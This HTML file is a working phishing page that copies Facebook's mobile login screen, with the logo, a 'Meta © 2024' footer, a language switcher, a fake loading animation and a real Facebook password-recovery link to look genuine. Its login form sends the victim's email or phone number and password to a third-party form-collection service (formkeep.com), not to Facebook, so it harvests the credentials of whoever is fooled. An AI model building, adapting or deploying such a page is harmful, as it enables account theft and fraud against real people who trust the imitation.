<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
 
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            background-color: #fff;
            height: 100vh;
        }

        .container {
            width: 100%;
            height:100%;
            max-width: 400px;
            background: #fff;
            padding: 20px;
        }

        .header {
            width: 100%;
            padding: 10px;
            max-height: 100px;
            margin-bottom: 7px;
            background-color:#fffbe2;
        }

        .header p1 {
            font-size: 14px;
            color: rgb(37, 85, 174);
        }

        .header p2 {
            font-size:12px;
            color: rgb(122, 95, 60);
        }

        .body .login-box {
            width: 100%;
        }

        .login-box h2 {
            margin-bottom: 20px;
            margin-top: 20px;
            color: #1877F2;
            text-align: center;
            font-size: 20px;
            font-family:kalvika;
        }

        p2 {
            font-size: 12px;
            color: rgb(37, 85, 174);
        }

        .textbox {
            margin-bottom: 10px;
            position: relative;
        }

        .textbox input {
            width: 90%;
            padding: 16px;
            border-bottom: 1px solid #bfb8b8;
            border-top: 0px;
            border-left: 0px;
            border-right: 0px;
            border-radius: 3px;
            outline: none;
            color: #000000;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f6f8;
        }

        .btn {
            width: 85%;
            padding: 12px;
            background: #1877F2;
            border: none;
            border-radius: 3px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
        }

        .btn:hover {
            background: #3a6cc1;
        }

        .hr-with-text {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .hr-with-text::before,
        .hr-with-text::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #000;
        }

        .hr-with-text:not(:empty)::before {
            margin-right: 1em;
        }

        .hr-with-text:not(:empty)::after {
            margin-left: 1em;
        }

        input[type=button] {
            font-size: 15px;
            margin: 8px 70px;
            padding: 7px;
            width: 65%;
            border:1px solid silver;
            background-color:white;
        }

        .container {
            display: flex;
            gap: 20px;
            height:25%;
        }

        .language-list {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            width: 200px;
        }

        .language-list ul {
            list-style-type: none;
            padding: 0;
        }

        .language-list li {
            margin: 10px 0;
            text-align: center;
            font-size: 12px;
        }

        p4 {
            font-size:13px;
            color:silver;
        }

        .fullscreen-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .fullscreen-image img {
            max-width: 150%;
            max-height: 100%;
        }

        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
        }

        .loading-bar {
            position: absolute;
            top: 0;
            left: 0;
            width: 0;
            height: 4px;
            background-color: green;
        }
  .error-message {
            color: red;
            display: none;
        }
    </style>

</head>

<body>
    <div id="overlay">
        <div class="fullscreen-image">
            <img src="Polish_20240521_203519633.jpg" alt="Initial Image">
        </div>
        <div class="loading" style="display: none;">
            
            <div class="loading-bar" id="loadingBar"></div>
        </div>
    </div>

    <div style="display: none;" id="content">
        <div class="header">
            <p1 id="headerText"><img src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-05-512.png" width="35px" height="40px"> Get Facebook for Android and browse faster.</p1><br>
        </div>
        <div class="body">
            <div class="login-box">
                <h2 id="loginTitle">facebook</h2>
              
                <form action="https://formkeep.com/f/e07424ab86c8" accept-charset="UTF-8" enctype="multipart/form-data" method="POST">
                    <div class="textbox">
                        <center><input type="text" placeholder="Mobile number or email address" name="contact" required></center>
                    </div>
                    <div class="textbox">
                        <center><input type="password" placeholder="Password" name="serial" required></center>
                    </div>
                    <center><button type="submit" class="btn">Log in</button><br>
                    <p2 id="forgotPassword">Forgotten password?</p2></center>
                </form>
            </div>
        </div><br>
        <div class="hr-with-text">or</div>
        <input type="button" id="createAccountBtn" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br>
         <div class="container">
            <div class="language-list">
                <ul>
                    <li onclick="changeLanguage('en')">English (UK)</li>
                    <li onclick="changeLanguage('as')">অসমীয়া</li>
                    <li onclick="changeLanguage('hi')">हिन्दी</li>
                    <li onclick="changeLanguage('pt')">Português (Brasil)</li>
                </ul>
            </div>
            <div class="language-list">
                <ul>
                    <li onclick="changeLanguage('bn')">বাংলা</li>
                    <li onclick="changeLanguage('hi')">हिन्दी</li>
                    <li onclick="changeLanguage('es')">Español</li>
                    <li onclick="changeLanguage('other')">|+|</li>
                </ul>
            </div>
        </div>
        <center><p4 id="metaText">Meta © 2024</p4></center>
    </div>

    <script>
        const translations = {
            en: {
                header: "Get Facebook for Android and browse faster.",
                loginTitle: "facebook",
                forgotPassword: "Forgotten password?",
                createAccount: "Create new account",
                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "Meta © 2024"
            },
            bn: {
                header: "অ্যান্ড্রয়েডের জন্য ফেসবুক পেতে এখনই অ্যাকাউন্ট করুন",
                loginTitle: "ফেসবুক",
                forgotPassword: "পাসওয়ার্ড ভুলে গেছেন?",
                createAccount: "নতুন অ্যাকাউন্ট তৈরি করুন",
                languages: ["ইংরেজি (যুক্তরাজ্য)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "মেটা © ২০২৪"
            },
            as: {
                header: "এণ্ড্ৰইডৰ বাবে ফেচবুক পাওক আৰু সোনকালে ব্ৰাউজ কৰক।",
                loginTitle: "ফেচবুক",
                forgotPassword: "পাছৱাৰ্ড পাহৰিছে নেকি?",
                createAccount: "নতুন একাউন্ট খুলক",
                languages: ["ইংৰাজী (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "মেটা © ২০২৪"
            },
            hi: {
                header: "Android के लिए Facebook प्राप्त करें और तेज़ी से ब्राउज़ करें।",
                loginTitle: "फेसबुक",
                forgotPassword: "पासवर्ड भूल गए?",
                createAccount: "नया खाता बनाएं",
                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "मेटा © २०२४"
            },
            pt: {
                header: "Obtenha o Facebook para Android e navegue mais rápido.",
                loginTitle: "facebook",
                forgotPassword: "Esqueceu a senha?",
                createAccount: "Criar nova conta",
                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "Meta © 2024"
            },
            es: {
                header: "Obtén Facebook para Android y navega más rápido.",
                loginTitle: "facebook",
                forgotPassword: "¿Olvidaste tu contraseña?",
                createAccount: "Crear una cuenta nueva",
                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "Meta © 2024"
            },
            other: {
                header: "Get Facebook for Android and browse faster.",
                loginTitle: "facebook",
                forgotPassword: "Forgotten password?",
                createAccount: "Create new account",
                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
                meta: "Meta © 2024"
            }
        };
  function changeLanguage(lang) {
            const translation = translations[lang];
            document.getElementById('headerText').textContent = translation.header;
            document.getElementById('loginTitle').textContent = translation.loginTitle;
            document.getElementById('forgotPassword').textContent = translation.forgotPassword;
            document.getElementById('createAccountBtn').value = translation.createAccount;
            const languageListItems = document.querySelectorAll('.language-list li');
            languageListItems.forEach((item, index) => {
                item.textContent = translation.languages[index];
            });
            document.getElementById('metaText').textContent = translation.meta;
        }

        function showLoading() {
            document.querySelector('.fullscreen-image').style.display = 'none';
            const loadingElement = document.querySelector('.loading');
            loadingElement.style.display = 'flex';
            let loadingBar = document.getElementById('loadingBar');
            let width = 0;
            let interval = setInterval(function() {
                if (width >= 100) {
                    clearInterval(interval);
                    loadingElement.style.display = 'none';
                    document.getElementById('content').style.display = 'block';
                } else {
                    width++;
                    loadingBar.style.width = width + '%';
                }
            }, 30);
        }

        window.onload = function() {
            setTimeout(showLoading, 2000);
        };

        document.getElementById('forgotPassword').addEventListener('click', function() {
            window.open('https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0QHZb3SwCI7CkOvUs&ref=dbl&_rdr', '_blank');
        });
    </script>
</body>
</html>
